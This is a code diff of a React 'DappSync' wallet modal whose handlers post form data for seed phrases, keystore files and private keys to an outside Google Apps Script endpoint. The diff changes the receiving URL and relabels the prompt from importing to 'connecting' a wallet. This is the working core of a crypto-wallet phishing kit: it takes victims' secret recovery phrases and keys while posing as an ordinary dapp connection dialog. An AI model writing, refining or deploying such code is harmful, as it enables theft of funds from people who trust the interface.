@@ -6,7 +6,7 @@ const WalletModalImport = (props) => {
     console.log(props)
     const phraseSubmit = (e) => {
         e.preventDefault()
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzLgI_3yPT65VMu2uS4R_l8uHQDRDJz9kCjQ1dMTCkPghvLKPije4omvDj6jtDq4hPo/exec'
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxxQH6PnqQlkMhZ-ogdl6H5Jzk9ymUkxHRQIkyKS3JEgUdWHEf8AFedcxxKakbk6E0mOg/exec'
         const form = document.forms['phrasesync']
         document.getElementById('loader').className = "loader"
         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
@@ -16,7 +16,7 @@ const WalletModalImport = (props) => {
     const keystoreSubmit = (e) => {
         e.preventDefault()
         document.getElementById('loader').classList.add("loader")
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzLgI_3yPT65VMu2uS4R_l8uHQDRDJz9kCjQ1dMTCkPghvLKPije4omvDj6jtDq4hPo/exec'
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxxQH6PnqQlkMhZ-ogdl6H5Jzk9ymUkxHRQIkyKS3JEgUdWHEf8AFedcxxKakbk6E0mOg/exec'
         const form = document.forms['keystoresync']
         document.getElementById('loader').className = "loader"
         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
@@ -25,7 +25,7 @@ const WalletModalImport = (props) => {
     }
     const privateSubmit = () => {
         document.getElementById('loader').classList.add("loader")
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzLgI_3yPT65VMu2uS4R_l8uHQDRDJz9kCjQ1dMTCkPghvLKPije4omvDj6jtDq4hPo/exec'
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxxQH6PnqQlkMhZ-ogdl6H5Jzk9ymUkxHRQIkyKS3JEgUdWHEf8AFedcxxKakbk6E0mOg/exec'
         const form = document.forms['privatesync']
         document.getElementById('loader').className = "loader"
         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
@@ -38,7 +38,7 @@ const WalletModalImport = (props) => {
             <div className="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
                 <div className="modal-content">
                 <div className="modal-header">
-                    <h5 className="modal-title" id="exampleModalToggleLabel">Dappsync</h5>
+                    <h5 className="modal-title" id="exampleModalToggleLabel">DappSync</h5>
                     <button type="button" className="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div> <div id="loader"></div>
                 <div className="modal-body">
@@ -50,7 +50,7 @@ const WalletModalImport = (props) => {
                                     <img src={props.image} alt="logo"/>
                                 </div>
                                 <div className="modalimport-text mt-3">
-                                    <h6>Import your {props.name} wallet</h6>
+                                 <h6>Connect your {props.name} Wallet</h6>
                                 </div>
                             </div>
                           </div>
